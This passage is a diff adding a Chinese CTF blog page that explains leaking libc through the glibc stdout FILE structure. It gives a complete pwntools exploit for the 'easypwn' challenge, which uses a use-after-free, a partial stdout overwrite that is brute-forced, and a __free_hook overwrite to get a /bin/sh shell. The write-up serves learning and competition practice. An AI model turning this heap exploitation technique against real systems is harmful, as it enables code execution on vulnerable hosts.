fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base &#x3D; fp-&gt;_IO_write_ptr &#x3D; fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end &#x3D; (fp-&gt;_mode &lt;&#x3D; 0</span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面来说一下stdout的原理。其实最后输出的东西是依靠上图的<br>    return _IO_do_write (f, f-&gt;_IO_write_base，  f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</p>
+<p>来实现我们的输出，而在再这三个参数中，最重要的是第二个和第三个参数，第二个参数表示我们需要打印的起始地址，第三个表示我们打印的长度，而只要我们第三个的参数不为0，stdout便会输出东西，即使没有调用puts等函数，但最重要的是，需要绕过三个函数的重重检验。这里的话不细说，像了解的话可以去参考上面的源码。这里直接记录一下一般的绕过payload吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(0xfbad1800)+p64(0x0)*3+&#39;\x00&#39;</span><br></pre></td></tr></table></figure>
+
+<p>上面就是伪造flags和，_IO_read_ptr;   _IO_read_end;  _IO_read_base;  _IO_write_base来绕过检测;</p>
+<p><strong>而我感觉用’\c8’去覆盖_IO_write_base更加合适，因为在libc2-27的时候，这样覆盖的话，泄露出来的地址就是IO_2_1_stdin，这样便可获得libc的基址。</strong></p>
+<p>而这里再说一下这个覆盖stdout的前提，是因为unsorted bin指向的main_arena+88这个位置，而这个stdout的地址和我们unsorted bin指向的地址就只是末位三位的差异，所以只要我们可以构造得到unsorted bin，然后配合UAF等，便可覆盖低位爆破stdout的地址，然后分配到stdout结构体处，达到泄露的目的。 </p>
+<p>这里顺便说一下另一个用法：对于没有tcache的 glibc 版本，使用 <code>fastbin attack</code>就好，因为<code>_IO_2_1_stdout_</code>上面就是<code>_IO_2_1_stderr_</code>， <code>stderr-&gt;__pad2</code>一般是指向<code>_IO_wide_data_2</code>的指针，而<code>_IO_wide_data_2</code>是在libc中的，所以我们可以用其来伪造size。</p>
+<p>这里记录一下，在libc 2-27中，stdout的低三位是0x760，但是我们去覆盖的时候，不能只覆盖三位的，只可以覆盖四位（p16），所以这里一般就要写脚本去爆破第四位。libc2-23的低三位是0x5dd？</p>
+<h1 id="钓鱼城杯的easypwn"><a href="#钓鱼城杯的easypwn" class="headerlink" title="钓鱼城杯的easypwn"></a>钓鱼城杯的easypwn</h1><p>ida截图（保护全开）</p>
+<p><strong><img src="/2020/08/29/stdout%E7%88%86%E7%A0%B4libc/1.png" class></strong></p>
+<p>这里的delete函数存在UAF，然后show函数并没有打印出有用的东西，给了libc 2-27的，说明tcache可以使用（方便很多），但是有个次数限制，不过只要把次数用光，让它减少到负数即可（转换为无符号数便可绕过）。</p>
+<p>所以我们就是要用到上面的那种方法去泄露libc地址，然后去修改free_hook即可。</p>
+<p>最终EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level &#x3D; &#39;DEBUG&#39;</span><br><span class="line">def menu(ch):</span><br><span class="line">        p.sendlineafter(&#39;Your choice :&#39;,str(ch))</span><br><span class="line">def new(index,size,content):</span><br><span class="line">        menu(1)</span><br><span class="line">        p.sendlineafter(&#39;id:&#39;,str(index))</span><br><span class="line">        p.sendlineafter(&#39;size:&#39;,str(size))</span><br><span class="line">        p.sendafter(&#39;content:&#39;,content)</span><br><span class="line">def edit(index,content):</span><br><span class="line">        menu(2)</span><br><span class="line">        p.sendlineafter(&#39;id:&#39;,str(index))</span><br><span class="line">        p.sendafter(&#39;content:&#39;,content)</span><br><span class="line">def free(index):</span><br><span class="line">        menu(3)</span><br><span class="line">        p.sendlineafter(&#39;id:&#39;,str(index))</span><br><span class="line">def show(index):</span><br><span class="line">        menu(4)</span><br><span class="line">p&#x3D;process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">def pwn():</span><br><span class="line">    #p &#x3D; process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">    libc &#x3D;ELF(&#39;.&#x2F;libc-2.27.so&#39;)</span><br><span class="line">    for i in range(10):</span><br><span class="line">        new(i,0xF0,&#39;aaa&#39;)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    for i in range(8):</span><br><span class="line">        free(0) # here is to leak the unsoreted bin location</span><br><span class="line">    edit(0,p16(0x6760))</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    new(10,0xF0,&#39;aaa&#39;)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    new(11,0xF0,p64(0xfbad1800) + p64(0)*3 + p8(0xc8))</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    libc_base&#x3D;u64(p.recvuntil(&#39;\x7F&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;_IO_2_1_stdin_&#39;]</span><br><span class="line">    log.info(&#39;LIBC:\t&#39; + hex(libc_base))</span><br><span class="line">    free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">    system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    free(0)</span><br><span class="line">    edit(0x0,p64(free_hook))</span><br><span class="line">    new(14,0xF0,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">    new(15,0xF0,p64(system))</span><br><span class="line">    free(14)</span><br><span class="line">    p.interactive()</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        pwn()</span><br><span class="line">    except:</span><br><span class="line">        p.close()</span><br><span class="line">        p&#x3D;process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>
+
+<p>注：由于需要爆破，所以代码跑的时间比较长。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/libc%E6%B3%84%E9%9C%B2-pwn/" rel="tag"> <i class="fa fa-tag"></i> libc泄露 pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/08/13/Sudo-CVE-2019-18634-%E5%A4%8D%E7%8E%B0/" rel="next" title="Sudo CVE-2019-18634 复现">
+                <i class="fa fa-chevron-left"></i> Sudo CVE-2019-18634 复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/z.jpg"
+                alt="Tiegu Zhu" />
+            
+              <p class="site-author-name" itemprop="name">Tiegu Zhu</p>
+              <p class="site-description motion-element" itemprop="description">沉下心来，去感受二进制的魅力</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tages/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Pig-sudo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/Tiegu" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.andseclab.com/" title="广工AD攻防工作室" target="_blank">广工AD攻防工作室</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sunxiaokong.xyz" title="孙小空" target="_blank">孙小空</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://hed9eh0g.top/" title="Hed9eh0g" target="_blank">Hed9eh0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.keyboy.xyz/" title="keyboy" target="_blank">keyboy</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/DEADF1SH-CAT/" title="DEADF1SH-CAT" target="_blank">DEADF1SH-CAT</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前置知识"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#FILE结构"><span class="nav-number">2.1.</span> <span class="nav-text">FILE结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结构体中的flags"><span class="nav-number">2.2.</span> <span class="nav-text">结构体中的flags</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#put函数执行流程-（了解stdout执行流程）"><span class="nav-number">2.3.</span> <span class="nav-text">put函数执行流程  （了解stdout执行流程）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stdout爆破原理"><span class="nav-number">3.</span> <span class="nav-text">stdout爆破原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#钓鱼城杯的easypwn"><span class="nav-number">4.</span> <span class="nav-text">钓鱼城杯的easypwn</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tiegu Zhu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
